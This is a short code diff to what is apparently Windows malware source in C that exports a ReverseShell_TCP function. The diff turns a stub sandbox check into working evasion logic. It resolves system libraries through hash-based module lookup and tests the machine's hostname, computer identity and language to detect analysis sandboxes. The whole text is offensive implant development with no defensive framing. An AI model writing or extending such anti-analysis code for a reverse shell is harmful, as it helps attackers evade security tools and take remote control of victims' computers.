@@ -2,7 +2,9 @@
 #include <windows.h>
 #include <shellapi.h>
 #include <stdio.h>
+
 #include "winapi.h"
+#include "sandbox.h"
 
 #pragma comment(lib, "ws2_32.lib")
 // UTF16("str") == L"str" # Wide Character String / UTF-16
@@ -23,9 +25,12 @@ size_t strlen(const char* str) {
 }
 
 static bool sandbox_checks() {
-    bool is_sandbox = false;
+    HMODULE hKernel32 = CustomGetModuleHandle(KERNEL32_HASH);
+    HMODULE hUser32   = CustomGetModuleHandle(USER32_HASH);
 
-    return is_sandbox;
+    return !is_valid_hostname(get_hostname(hKernel32)) ||
+           !is_valid_computer(hKernel32) ||
+           !is_valid_language(hKernel32, hUser32);
 }
 
 __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
